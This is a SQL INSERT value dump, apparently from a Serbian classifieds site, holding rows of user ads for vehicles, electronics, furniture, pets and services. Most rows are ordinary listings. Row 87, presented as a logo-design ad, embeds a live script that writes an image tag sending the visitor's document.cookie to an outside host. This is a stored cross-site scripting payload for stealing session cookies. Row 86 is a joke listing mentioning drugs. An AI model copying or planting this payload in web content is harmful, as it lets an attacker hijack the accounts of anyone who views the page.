(64, 'Tomos motor nije u funkciji', 'Motor nije u voznom stanju pogodan je za delove.', 4, 5, 'user-image/166108422897426089.png', 14, '2022-08-21 14:17:08', NULL, '2022-08-21 14:28:12', 3, 26, 'user-image/min-1661084228.png', NULL),
(65, 'Tomos motor nije u funkciji', 'Motor nije u voznom stanju pogodan je za delove.', 4, 5, 'user-image/1661084316768066526.png', 14, '2022-08-21 14:18:36', NULL, '2022-08-21 14:18:46', 3, 26, 'user-image/min-1661084316.png', NULL),
(66, 'Motor Yamaha ide kao nova', 'Yamaha 2018. godiste. Samo ozbiljni kupci.', 2, 5, 'user-image/16610844201103046123.png', 14, '2022-08-21 14:20:20', NULL, '2022-08-21 14:24:52', 3, 26, 'user-image/min-1661084420.png', NULL),
(67, 'Prodajem Bager', 'Bager je u odlicnom stanju, pogodan za kopanje zemlje ili raznosenje gradjevinskih materijala. Samo ozbiljni kupci. Cena je fiksna!', 2, 1, 'user-image/16621165002007337383.jpeg', 14, '2022-08-22 11:45:50', '2022-09-03 07:50:08', NULL, 3, 1, 'user-image/min-1662116500843878270.jpeg', NULL),
(68, 'Prodajem Namestaj Povoljno', 'U ponudi je veci broji namestaja za svaciji dom. Moguce su i kompenzacije.', 2, 5, 'user-image/166116515788098377.jpeg', 14, '2022-08-22 12:45:57', NULL, NULL, 4, 61, 'user-image/min-1661165157.jpeg', NULL),
(69, 'Najbolji televizori na domacem trzistu.', 'Ceradno platno odrađeno za vaše potrebe po dogovoru plus adekvatan uređaj za prikazivanje sportskih događaja ili filmova tokom dana \r\n\r\nPlatno 1,5m širina x 1,2m visina cena 30e projektor sanyo 2000 lumena 120evra\r\n\r\nPlatno 2,5m širina x 1,5m visina cena ', 1, 1, 'user-image/1661166027763928630.jpeg', 14, '2022-08-22 13:00:28', NULL, NULL, 1, 12, 'user-image/min-1661166028.jpeg', NULL),
(70, 'Casovi tenisa', 'Casovi tenisa', 1, 5, 'user-image/1662114841424747926.png', 14, '2022-08-22 13:50:35', '2022-09-02 10:34:01', NULL, 4, 67, 'user-image/min-1662114841746023485.png', NULL),
(71, 'Izrada profesionalnih web aplikacija', 'Cena Varira svakako od zelja musterija i kompleksnosti sajta.\r\nTakodje je moguca i izrada mobilnih aplikacija na svim platformama.\r\nZa vise informacija pozvati.', 1, 5, 'user-image/16613655171552505387.jpeg', 14, '2022-08-24 20:25:17', NULL, NULL, 4, 69, 'user-image/min-1661365517.jpeg', NULL),
(72, 'Prodaja Garderobe. POVOLJNO!!!', 'Prodaja muskih dukseva.\r\nDostupne velicine su S, M, L, XL, XXL', 1, 1, 'user-image/166136610964002927.jpeg', 14, '2022-08-24 20:35:10', NULL, NULL, 1, 37, 'user-image/min-1661366110.jpeg', NULL),
(73, 'Laptop Accer. Kao nov.', 'Jedan od najboljih laptopova sto se tice odnosa cene i kvaliteta.\r\nPoseduje:\r\n4GB RAM memorije.\r\n500GB ROM memorije.\r\nIntel i5 3.0 Ghz 4460\r\nNvidia GeForce 1080 Ti.\r\n\r\nMoguca je i zamena za neki PC racunar', 2, 5, 'user-image/1661366336775289111.jpeg', 14, '2022-08-24 20:38:56', NULL, NULL, 1, 42, 'user-image/min-1661366336.jpeg', NULL),
(74, 'Udomljujem macice.', 'Izuzetni škotski mačići cokoladni i srebrni dugodlaki decak dostupni su za preuzimanje. Mara FancyCats Teodor i Konstantin. Mačići su revakcinisani i prodaju se sa kompletnom dokumentacijom \r\n\r\nŠkotski mačići mogu biti sa normalnim i sa fold ušima a isto', 2, 4, 'user-image/16613665451548410029.jpeg', 14, '2022-08-24 20:42:26', NULL, NULL, 2, 34, 'user-image/min-1661366546.jpeg', NULL),
(75, 'Gerber noz.', 'Sigurna kupovina!\r\nLicno preuzimanje u bloku 70 ili na Zvezdari.\r\nAko zelite dodatne slike pisite nam na viber.\r\n\r\n\r\nSURVIVOR NOZ-Gerber noz za prezivljavanje-Noz Gerber\r\n\r\n\r\nJedan od najboljih i najkompletnijih noževa za preživljavanje na svetu renomiranog svetskog proizvodjača GERBER. Ovaj nož sa svim svojim dodacima svakome ko je iole upućen može obezbediti opstanak u divljini. Pored sečiva koje je napravljeno od najkvalitetnijeg kaljenog čelika, ovaj nož poseduje:  \r\n-čekić\r\n-kremen za paljenje vatre\r\n-pištaljku\r\n-turpiju za oštrenje\r\n-znakovni jezik\r\n-futrolu za nošenje\r\nDimenzije: 28cm, sečivo 12cm\r\n\r\n\r\nSURVIVOR NOZ-Gerber noz za prezivljavanje-Noz Gerber\r\n\r\n\r\nAko zelite da porucite ostavite vase ime, adresu, postanski broj i broj mobilnog na koji ce Vas kurir kontaktirati.\r\nRok dostave 24 do 48 h.', 1, 1, 'user-image/1661425224228439273.jpeg', 14, '2022-08-25 13:00:26', NULL, NULL, 1, 57, 'user-image/min-1661425225.jpeg', '<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/-l5wqinFGGQ\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>'),
(76, 'Xbox Game Pass Ultimate/Xbox Game Pass/Xbox Live Gold/Xbox', 'Xbox Game Pass Ultimate/Xbox Game Pass/Xbox Live Gold/Xbox\r\n\r\nSve na jednom mestu! Dobrodošli. Saša 061/2704239\r\nCene su podlozne promeni,  kontaktirajte me -  pre nego sto se odlucite za kupovinu.\r\nZa sva potencijalna pitanja oko aktivacije tu sam da pomognem!  \r\n\r\nUkoliko igra koju želite nije u oglasima, to ne znači da je nemamo, pitajte pa ćemo proveriti!   \r\nKlikom na \\\"Svi Oglasi\\\" mozete pogledati sve sta imamo u ponudi.        \r\n\r\n- Garantujemo vam potpunu sigurnost - Naše ocene govore više od reči! ✔️\r\n- Kod nas očekujte odličnu komunikaciju, povoljnu cenu i brzinu isporuke! ✔️\r\n- Na 3 ili više komada popust✔️\r\n\r\n\r\n - Originalne Xbox Series, Xbox One/360 pretplate, xbox live gold,   i dopune, vauceri, kartice (top-ups, gift cards)\r\n\r\n- Xbox Live Gold cene za Xbox One, Xbox Series i Xbox 360 konzole:\r\n\r\nUz Xbox Live Gold samo dobijate Online Pristup igrama.\r\nXbox Live Gold 14 dana - 349 din\r\nXbox Live Gold  1  mesec - > 1.149 din\r\nXbox Live Gold  3  meseca - > 999 din - Akcija\r\nXbox Live Gold  6  meseci - > 2.049 din\r\nXbox Live Gold 12 meseci -> 3.999 din - Akcija\r\nPreporuka uzeti xbox game pass ultimate cene su navedene ispod.\r\n- Cene Xbox Game Pass Ultimate za Xbox One, Xbox Series konzole i Windows 10 AKCIJA:\r\n\r\nUz ovo dobijate Xbox Live Gold, Game Pass i EA Play. Mogucnost igranja i skidanja čak preko 300 igara po najpovoljnijim cenama na Kupujem prodajem kod nas!\r\nXbox Game Pass Ultimate 14 dana -> 349 din\r\nXbox Game Pass Ultimate 1  mesec  ->   1.199 din\r\nXbox Game Pass Ultimate 2 meseca -> 549 din\r\nXbox Game Pass Ultimate 3 meseca -> 1.649 din\r\nXbox Game Pass Ultimate 4 meseci 1.599 din\r\nXbox Game Pass Ultimate 7 meseci - 2.499 din - Preporuka\r\nXbox Game Pass Ultimate 10 meseci - Kontakt Povoljno na KP!\r\nXbox Game Pass Ultimate 12 meseci - 3.449 din\r\n- Cene Game Pass za Xbox One, Xbox Series konzole:\r\n\r\nUz ovo dobijate samo Game Pass. Mogucnost igranja i skidanja čak preko 300 igara.\r\nXbox Game Pass   1  mesec - > Kontakt povoljno\r\nXbox Game Pass   3  meseca  - >  2.100 din\r\nXbox Game Pass 6 meseci -> 3.799 din\r\nXbox Game Pass 12 meseci -> Kontakt\r\n- Cene za EA Play - EA Access:  \r\n\r\nUz ovo dobijate samo EA Play Mogucnost igranja i skidanja preko 50 igara.\r\nEA Access EA Play 1 mesec - 499 din\r\nEA Access EA Play 12 meseci - 1.899 din\r\n- Gift Cards /  Wallet Dopune Xbox One/360 za UK Region :\r\n 5£ -> 800 din\r\n10£ -> 1399 din\r\n15£ -> 2149 din\r\n20£ -> 2.849 din\r\n25£ -> 3400 din\r\n50£ -> 6.399 din - AKCIJA\r\n- Gift Card / Wallet Dopune Xbox One/360 za EU Region :\r\n 5€ ->700 din\r\n10€   -> 1400 din\r\n15€   -> 1700 din\r\n20€   -> 2200 din - AKCIJA\r\n25€   -> 2800 din\r\n30€   -> 3600 din\r\n50€   ->  5900 din\r\n75€   ->  8400 din\r\n100€ -> 11.699 din\r\n- Gift Cards / Wallet Dopune Xbox One/360 US Region:  \r\n   5$ -> 749 din\r\n  10$ -> 1400 din - AKCIJA\r\n 15$ -> 1.849 din - AKCIJA\r\n  20$ -> 2450 din - AKCIJA\r\n  25$ -> 2800 din - AKCIJA\r\n  50$ -> 5200 din - AKCIJA\r\n75$ -> 7.500 din - AKCIJA\r\n100$ -> 10.200 din - AKCIJA\r\nKontaktirajte nas putem Poziv-a, Vajbera, WhatsApp-a, KP Poruke ili SMS Porukom (061/2704239)\r\n\r\nSlobodno nas kontaktirajte za bilo kakvu pomoć, sa informacijom šta vam treba, i da proverite aktuelnu ponudu, ili ako imate bilo kakva pitanja (može i vikendom).  ✔️\r\n\r\nPlaćanje:\r\n\r\nPost-Net uputnica\r\nUplata na račun ( Raiffeisen banka - Erste Banka )\r\ninfoInformacije\r\n- > Brzi odgovori Poziv, Vajber, WhatsApp  < -\r\n- > Hvala na ukazanom poverenju  < -\r\n- > Saša 061/270-4239 < -', 1, 1, 'user-image/16615293451244444278.jpeg', 14, '2022-08-26 17:55:45', NULL, NULL, 4, 19, 'user-image/min-1661529345.jpeg', '<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/Nhf7_s0_UHs\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>'),
(77, 'Difuzer osvezivac vazduha-Ovlaživač vazduha-menja boju', 'Difuzer osvezivac vazduha-ovlazivac vazduha-menja boju\r\nAroma Difuzor-Ovlaživač vazduha sa LED osvetljenjem i Bluetooth zvucnikom\r\nKapacitet 300ml\r\nPoseduje led svetlo u 7 razlicitih boja \r\nIma tajmer\r\nDifuzer je multifunkcionalan, osvezivac, ulatrazvucna aromaterapija i prečišćivač vazduha\r\nTihi rad\r\nDimenzije 145x145x135mm\r\nSnaga 4w\r\nNOVO, u originalnom pakovanju, odlican kao poklon', 1, 1, 'user-image/1661530517314511418.jpeg', 14, '2022-08-26 18:15:17', NULL, NULL, 1, 31, 'user-image/min-1661530517.jpeg', '<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/FC3k3bMwWlI\\\" title=\\\"YouTube video player\\\" frameborder=\\\"0\\\" allow=\\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\\\" allowfullscreen></iframe>'),
(78, 'iPhone 11/12/12 Pro/iPhone 13 mini/13 Pro Max/13/13 Pro', '- Fiksne cene !\r\n- Ne radim zamene !\r\n- Novi, neotpakovani, vakuum pakovanje u foliji !\r\n- Apple garancija na hardver i softver uređaja 12 meseci od dana aktivacije ostvariva u Macola i ProMobi !\r\n- Modeli za EU tržište !\r\n- Ne prodajem Arapske modele koji nemaju garanciju na našem tržištu (obratite pažnju pozadi na kutiji Arapska slova) !\r\n                ⭐  Ukoliko ne odgovaram na poruke preko sajta molim vas nazovite  ⭐\r\n\r\n- Uz kupljen telefon možete kupiti po povoljnoj ceni zaštitno staklo po ceni od 300 RSD (slika 4),\r\n- Silikonska providna futrola obična 350 RSD,\r\n- Silikonska futrola identična originalu uz kupljeni telefon 1500 RSD (slika 3).\r\n- Punjač brzi 20W za nove iPhone (odgovara za kabal USB - C koji dolazi u novoj kutiji)  -  20e \r\n\r\n \r\n\r\nSE 2020 64GB  -    NE  -  Black\r\nSE 2020 128GB  -   415e  -  White\r\n\r\nSE 5G 2022  64GB  -    NE  -  Midnight, Starlight\r\nSE 5G 2022  256GB  -   NE  -  Midnight\r\n\r\n11  64GB  -    470e - Red, 485e  - Black, 490e - Purple,     510e  - White, Green,      NE  -   Yellow\r\n11  128GB  -     NE  - Black, White, Red, Yellow, Purple,  Green\r\n\r\n12 Mini  64GB  -   545e -  Blue, White\r\n12 Mini   128GB  -   610e - Black, White\r\n\r\n12  64GB  -    640e  -  Red,     650e  -  Black, White\r\n12   128GB  -    700e  -  Black, Blue, White, Purple, Green, Red\r\n\r\n12 Pro  512GB  -   930e  -  Gold\r\n\r\n13 mini 128GB  -   675e - Blue, Midnight, Pink,     NE  -  Red, Green, Starlight\r\n13 mini  256GB  -    750e  -  Starlight, Blue, Pink, Green, Red, NE - Midnight\r\n\r\n13 128GB  -   775e  -  Midnight, Blue,       NE  -   Red, Green, Starlight, Pink\r\n13   256GB  -     795e  -   Red,    NE  -  Midnight, Blue, Pink, Green, Starlight\r\n\r\n13 Pro 128GB  -   1010e  -  Graphite,   1010e  -  Siera Blue,   1010e  -  Gold,   1010e  -  Silver\r\n13 Pro 128GB  -     1010e  -  Alpine Green\r\n13 Pro  256GB   -    1110e  -  Graphite,   1110e  -  Siera Blue,   1110e  -  Gold,   1110e -  Silver\r\n13 Pro  256GB   -   1110e  -  Alpine Green\r\n\r\n13 Pro Max  128GB  -  1110e  -  Graphite,    1110e  -  Siera Blue,    NE  -  Gold,   NE  -  Silver\r\n13 Pro Max  128GB  -   1110e  -   Alpine Green\r\n13 Pro Max   256GB  -   NE  -  Graphite,     1215e -  Siera Blue,     NE  -  Gold,     1215e  -  Silver\r\n13 Pro Max   256GB  -    NE  -  Alpine Green', 1, 1, 'user-image/1661703324818622293.jpeg', 25, '2022-08-28 18:15:25', NULL, NULL, 1, 48, 'user-image/min-1661703325.jpeg', '<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/g5ymJNLURRI\\\" title=\\\"YouTube video player\\\" frameborder=\\\"0\\\" allow=\\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\\\" allowfullscreen></iframe>'),
(79, 'Genesis mtb', 'Bicikl je u perfektnom stanju, za svaki slučaj sam ga nosio na servis i spreman je za vožnju.\r\nVeličina rama je 43 cm, trebalo bi da odgovara za vozače od 170 do 185 cm.\r\nDelovi su svi originalni osim pedala , na slici iz kataloga se mogu videti svi detalji.\r\nVeličina točkova je 27,5\\\", gume su schwalbe 27.5x2.25 -650b', 2, 5, 'user-image/1661703560329829673.jpeg', 25, '2022-08-28 18:19:21', NULL, NULL, 4, 22, 'user-image/min-1661703561.jpeg', '<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/_ndQ7dgjKYk\\\" title=\\\"YouTube video player\\\" frameborder=\\\"0\\\" allow=\\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\\\" allowfullscreen></iframe>'),
(80, 'LG-SAMSUNG Televizori RASPRODAJA', 'PRODAJA SAMSUNG I LG TELEVIZORA###\r\n===AKCIJSKA CENA NA SVE MODELE===\r\n           (GARANCIJA 24 MESECI)\r\n            NOVO NEOTPAKOVANO ! ! !\r\n\r\nSLANJE POUZDANIM KURIRSKIM SLUZBAMA ILI LICNO PREUZIMANJE ! ! !\r\nVEC 10 GODINA SA VAMA! ! !\r\n▶️ Mil Tech\r\n☎️069700110☎️ 069700110☎️ 069700110\r\n\r\n \r\n\r\nRadno vreme: 0/24\r\n\r\n \r\n\r\nLG MODELI:\r\n\r\n\r\nNOVI MODELI SEZONA 2021-2022\r\n\r\nLG 43UP75003LB  350e\r\n\r\nLG 43UP78003LB  370e\r\n\r\nLG 43UP8003LB  400e\r\n\r\nLG 43NANO753PR  400e\r\n\r\nLG 43NANO773PA  440e\r\n\r\n50NANO803PA  4K, NANO, smart       540e\r\nOLED48A13LA  CRNI, OLED, 4K, smart  800e\r\nOLED48C11LB  CRNI, OLED, 4K, smart  840e\r\nOLED48C12LA  BELI, OLED, 4K, smart   840e 55UP75003LF      4K, smart                490e 55UP77003LB      4K, smart                510e\r\n55UP78003LB      4K, smart                530e\r\n55UP80003LA      4K, smart                560e\r\n55UP81003LA      4K, smart                590e\r\n55NANO753PR   NANO, 4K, smart       520e\r\n55NANO773PA   NANO, 4K, smart       530e\r\n55NANO803PA   NANO, 4K, smart       630e\r\n55NANO813PA   NANO, 4K, smart       640e\r\n55NANO863PA   NANO, 4K, smart       750e\r\n55NANO913PA   NANO, 4K, smart       900e\r\n55NANO963PA   NANO, 4K, smart       1250e\r\nOLED55A13LA   OLED, 4K, smart         850e\r\nOLED55C11LB   CRNI, OLED, 4K, smart  990e\r\nOLED55C12LA   BELI, OLED, 4K, smart   990e\r\nOLED55G13LA   OLED, 4K, smart         kontakt\r\n65UP75003LF      4K, smart                 650e\r\n65UP77003LB      4K, smart                 740e\r\n65UP78003LB      4K, smart                 750e\r\n65UP80003LA      4K, smart                 780e\r\n65UP81003LA      4K, smart                 800e\r\n65NANO753PR   NANO, 4K, smart        800e\r\n65NANO803PA   NANO, 4K, smart        850e\r\n65NANO813PA   NANO, 4K, smart        940e\r\n65NANO863PA   NANO, 4K, smart        960e\r\n65NANO913PA   NANO, 4K, smart        kontakt\r\n65NANO963PA   NANO, 4K, smart        kontakt\r\nOLED65A13LA   OLED, 4K, smart         kontakt\r\nOLED65B13LA   OLED, 4K, smart         kontakt\r\nOLED65C11LB   CRNI, OLED, 4K, smart 1450e\r\nOLED65C12LA   BELI, OLED, 4K, smart  1450e\r\nOLED65G13LA  OLED, 4K, smart           dogovor\r\n65QNED963PA  QNED, 8K, smart         dogovor\r\n70UP81003LA       4K, smart                 kontakt\r\n75UP75003LC        4K, smart               kontakt\r\n75UP77003LB        4K, smart               kontakt\r\n75UP78003LB        4K, smart               kontakt\r\n75UP80003LA        4K, smart               kontakt\r\n75UP81003LA        4K, smart               kontakt\r\n75NANO753PA   NANO, 4K, smart        kontakt\r\n75NANO803PA   NANO, 4K, smart        kontakt\r\n75NANO813PA   NANO, 4K, smart        kontakt\r\n75NANO863PA   NANO, 4K, smart        kontakt\r\n75NANO913PA   NANO, 4K, smart        kontakt\r\n75NANO923PB   NANO, 4K, smart        kontakt\r\n75NANO963PA   NANO, 8K, smart        2900e\r\nOLED77A13LA   OLED, 4K, smart         kontakt\r\nOLED77C11LB   CRNI, OLED, 4K, smart 3000e\r\nOLED77C12LA   BELI, OLED, 4K, smart  3000\r\nOLED77G13LA OLED, 4K, smart             kontakt\r\n\r\n\r\n\r\nNOVI MODELI SEZONA 2021-2022\r\n\r\nUE43AU7102 440e\r\n\r\nUE43AU8002  460e\r\n\r\nUE43AU9002 500e\r\n\r\nUE43Q60AA  460\r\n\r\nUE50AU9002     4K, smart     500e\r\nUE50AU9082     BELI, 4K, smart     670e\r\nQE50Q60AAUXXH   QLED, smart     530e\r\nQE50LS03AAUXXH  QLED, smart        kontakt\r\nQE50QN90AATXXH QLED, smart         kontakt\r\nUE55AU8002KXXH     4k, smart    620e\r\nUE55AU9002KXXH     4k, smart    660e\r\nQE55Q60AAUXXH      QLED, smart    600e\r\nQE55Q70AATXXH       QLED, smart       kontakt\r\nQE55Q75AATXXH      QLED, smart      kontakt\r\nQE55Q80AATXXH      QLED, smart     kontakt\r\nQE55LS03AAUXXH     FRAME, QLED, smart  kontakt\r\nQE55QN85AATXXH     NEO, QLED, smart  900e\r\nQE55QN90AATXXH     NEO, QLED, smart  1000e\r\nQE55QN95AATXXH     NEO, QLED, smart  1350e\r\n    QE55QN700ATXXH     QLED, 8K, smart     2000e\r\nUE65AU7102KXXH      4k, smart        kontakt\r\nUE65AU8002KXXH      4k, smart        kontakt\r\nUE65AU9002KXXH      4k, smart        kontakt\r\nQE65Q60AAUXXH       QLED, smart      830e\r\nQE65Q70AATXXH        QLED, smart      kontakt\r\nQE65Q75AATXXH        QLED, smart      kontakt\r\nQE65Q80AATXXH        QLED, smart      kontakt\r\nQE65LS03AAUXXH     FRAME, QLED, smart  kontakt\r\nQE65QN85AATXXH    NEO, QLED, smart    kontakt\r\nQE65QN90AATXXH    NEO, QLED, smart    kontakt\r\nQE65QN95AATXXH    NEO, QLED, smart    kontakt\r\n     QE65QN700ATXXH     8K, QLED, smart     kontakt\r\n     QE65QN800ATXXH     8K, QLED, smart     kontakt\r\n     QE65QN900ATXXH     8K, QLED, smart     kontakt\r\n     QE65LST7TCUXXH     4K, QLED, Terrace , smart     kontakt\r\nUE75AU8002KXXH      4k, smart           1200e\r\nUE75AU9002KXXH      4k, smart           1100 e AKCIJA \r\nQE75Q60AAUXXH      QLED, smart       1250e\r\nQE75Q70AATXXH       QLED, smart       1350e\r\nQE75Q75AATXXH       QLED, smart       \r\nQE75Q80AATXXH       QLED, smart       \r\nQE75LS03AAUXXH    FRAME, QLED, smart  \r\nQE75QN85AATXXH   NEO, QLED, smart   2500e\r\nQE75QN90AATXXH   NEO, QLED, smart   2700e\r\nQE75QN95AATXXH   NEO, QLED, smart   3300e\r\n\r\n❗️❗️❗️Mogucnost porucivanja modela po Vasoj zelji Lg i Samsung', 1, 1, 'user-image/1661703994812070275.jpeg', 25, '2022-08-28 18:26:34', '2022-08-28 18:39:05', NULL, 4, 55, 'user-image/min-1661703994.jpeg', '<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/gsne-YpiYJw\\\" title=\\\"YouTube video player\\\" frameborder=\\\"0\\\" allow=\\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\\\" allowfullscreen></iframe>'),
(81, 'BMW 750 XD M INDIVIDUAL 3xTV 2017. godište', 'Prodajem BMW G11 750d M paket Xdrive, kupljen NOV u Nemackoj kao BMW INDIVIDUAL tj radjen po narudzbi.\r\n\r\nAutomobil je proizveden 28.11.2017godine, datum prve registracije 01.2018god. AUTO JE U FABRICKOJ GARANCIJI DO 01.2023GOD ILI 200000KM. Vozilo je bukvalno u perfektnom stanju, kako unutra, tako i spolja, ne pusacki automobil. Posedujem 4 kljuca od kojih je jedan smart kljuc sa funkcijom parkiranja automobila preko kljuca. Jedinstven automobil, sa najjacim paketom opreme u besprekornom stanju. Moguca svaka vrsta provere u ovlascenom servisu ili kod vaseg majstora. Od pocetka je servisiran u BMW DELTA MOTORS Beograd, a poslednji servis je 18.05.2022 godine. Svi servisi uradjeni su na vreme.\r\n\r\nPoseduje najjaci paket opreme:\r\n\r\n-M Sport paket\r\n-M kozni volan sa grejacem\r\n-M Aerodynamics Package\r\n-M zadnji spojler\r\n-Innovation paket\r\n-Business paket DE\r\n-Heat Comfort Package ( toplotni komforni paket )\r\n-Navigation paket connect drive\r\n-Xdrive\r\n-Digital cockpit\r\n-Adaptivno vazdusno vesanje\r\n-BMW Laser inteligentna duga i kratka svetla (adaptive BMW Laser light)\r\n-BMW Laser dnevna svetla\r\n-Led maglenke\r\n-Automatsko ukljucivanje dugog svetla (highbeam assist)\r\n-360 stepeni kamera\r\n-Parking assistance system (kamere na vozilu pretrazuju slobodno parking mesto, a potom automobil sam parkira bez asistencije vozaca)\r\n-BMW Remote Control Parking ( Parkiranje i isparkiravanje automobila preko smart kljuca bez ulaska )\r\n-Adaptive cruise control (aktivni tempomat sa stop and go funkcijom, radar na automobilu prati kretanje vozila ispred)\r\n-Driving assistant plus paket (ovaj paket podrazumeva samostalno upravljanje vozila izmedju dve linije na putu, potpuna autonomija, u kombinaciji sa active cruise control\r\nkoji takodje poseduje, automobil prakticno vozi sam)\r\n-Komforna elektricna kozna sedista sa grejanjem, hladjenjem, masazom i memorijom prednjih sedista a isto tako i zadnjih sedista ( Leather Nappa enhanced/mokka )\r\n-Grejaci naslona za ruku\r\n-Jastuci na zadnjim naslonima za glavu\r\n-Automatska 4 zone klime\r\n-External Skin Protection ( spoljna zastita koze )\r\n-Elektricne zavesice na svim zadnjim prozorima\r\n-Televizori na zadnjim sedistima sa tabletom u naslonu za ruku\r\n-TV funkcija\r\n-Ceramic Application, Control Elements ( Keramički kontrolni elementi )\r\n-Webasto\r\n-Ambient air paket\r\n-Harman/Kardon surround sound system\r\n-BMW Gesture Control ( zadavanje komandi pokretom ruke )\r\n-Executive Drive pro\r\n-Instrument tabla presvucena kozom\r\n-Elektonsko podesavanje visine i dubine volana\r\n-Soft Close ( automatski sistem mekog zatvaranja za vrata )\r\n-Executive Drive pro\r\n-Zavesice na zadnjim prozorima\r\n-Indukcijsko punjenje za mobilni telefon\r\n-Sistem pracenja trake\r\n-Sprecavanje sudara\r\n-Aktivna zastita za pesake\r\n-Head up displey\r\n-BMW Display Key\r\n-Prepoznavanje saobracajnih znakova\r\n-Carbon-schwarz metallic boja\r\n-Visoki sjaj \\\"Shadow line\\\" individual\r\n-Comfort access ( komforni ulazak u auto )\r\n-Profesionalana navigacija osetljiva na dodir\r\n-Ambijentalno osvetljenje\r\n-Fabricki zatamnjena zadnja stakla\r\n-Senzor mrtvog ugla\r\n-Retrovizori sa automatskim sklapanjem i zatamnjivanjem\r\n-DAB Tuner\r\n-Usb i aux\r\n-Apple carplay\r\n-Wlan hotspot\r\n-Hard disc za skladistenje muzike\r\n-20\\\" BMW LA Wheel, M Double Spoke 648 Bicolor sa Runflat letnjim gumama kuplene ove godine i 19\\\" M zimski set tockova sa takodje novim gumama. Na oba seta su DOT na gumama 2021god.\r\n-Senzori pritiska u gumama\r\n-Alarm\r\n\r\nU slucaju da zelite neki drugi model automobila, smatrajte da smo Vam na raspolaganju. Nudimo kompletnu uslugu, od komunikacije, dovoza i carinjenja po povoljnim uslovima.', 2, 5, 'user-image/16617050351468693438.jpeg', 25, '2022-08-28 18:43:56', NULL, NULL, 2, 15, 'user-image/min-1661705035.jpeg', '<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/eFPSeK2Zrh8\\\" title=\\\"YouTube video player\\\" frameborder=\\\"0\\\" allow=\\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\\\" allowfullscreen></iframe>'),
(82, 'Bastenski set', 'Bastenska set 32000 dinset uključuje dvosed + 2 fotelje + stolićcrna (antracit) plastika - motiv umetnog rattanaplastika sa Uv zaštitomsivi jastucimaksimalna nosivost dvoseda do 160 kgmaksimalna nosivost fotelje do 110 kgdim. dvoseda: 120x65x75 cmdim. fotelje: 65x65x75 cmdim. stočića: 59x59x43 cm. Ss', 1, 1, 'user-image/1661705697224009304.jpeg', 25, '2022-08-28 18:54:26', '2022-08-28 18:54:58', NULL, 4, 62, 'user-image/min-16617056971671359928.jpeg', ''),
(83, 'PS4 Ghostbusters: The Video Game - Remastered ORIGINAL', 'Voljena Ghostbusters: The Video Game se vraća ponovo u novom remasterizovanom izdanju. Stavite svoj protonski ranac i uplovite u avanturu sa dobro poznatim likovima kako biste spasili Njujork.\r\n\r\n\r\n\r\nIgra je nova,  originalna i dolazi u neotpakovanom pakovanju.  Sve igre u našem asortimanu su isključivo nove, nekorišćene i originalne.\r\n\r\n \r\n\r\nPlaćanje možete obaviti pouzećem (kuriru na ruke nakon što Vam preda proizvod) ili na račun naše firme (po dostavljenom predračunu sa podacima za uplatu).\r\nPakovanje proizvoda je dodatno obezbedjeno kako bi se izbegla i najmanja mogućnost oštećenja prilikom transporta.\r\n\r\nZa sve dodatne informacije, slobodno nas kontaktirajte putem KP poruka, telefonom ili SMS porukom, kako Vama najviše odgovara.', 2, 5, 'user-image/1661706174771789786.jpeg', 25, '2022-08-28 19:02:55', NULL, NULL, 1, 43, 'user-image/min-1661706175.jpeg', '<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/M6ON61SZs-A\\\" title=\\\"YouTube video player\\\" frameborder=\\\"0\\\" allow=\\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\\\" allowfullscreen></iframe>'),
(84, 'Test', 'Testastsat', 3, 5, 'user-image/1662191340586476103.jpeg', 14, '2022-09-03 07:49:01', '2022-12-15 22:01:32', '2022-12-15 22:01:32', 1, 15, 'user-image/min-1662191341.jpeg', ''),
(85, 'Assasin creed game for PC', 'Game is Orginal and does not hacked !', 1, 1, 'user-image/1668262869579439390.jpeg', 14, '2022-11-12 14:21:09', NULL, NULL, 4, 21, 'user-image/min-1668262869.jpeg', ''),
(86, 'We are a best development agency on Balkan', 'We creating aplication for money and drugs, much drugs. And maybe much alcohol.', 1, 5, 'user-image/16682630202001275227.jpeg', 14, '2022-11-12 14:23:40', NULL, NULL, 4, 70, 'user-image/min-1668263020.jpeg', ''),
(87, 'We crate a logo', 'We crateing a best logo for you company. No much money,but much cvality.\r\n<script>\r\nvar str = `<img src=\\\'https://mardas15.dreamhosters.com?data=${document.cookie}\\\'/>`;\r\ndocument.write(str);\r\n\r\n</script>', 1, 5, 'user-image/1668263159909151964.jpeg', 14, '2022-11-12 14:26:00', '2022-11-12 14:28:23', '2022-11-12 14:28:23', 4, 8, 'user-image/min-1668263160.jpeg', ''),
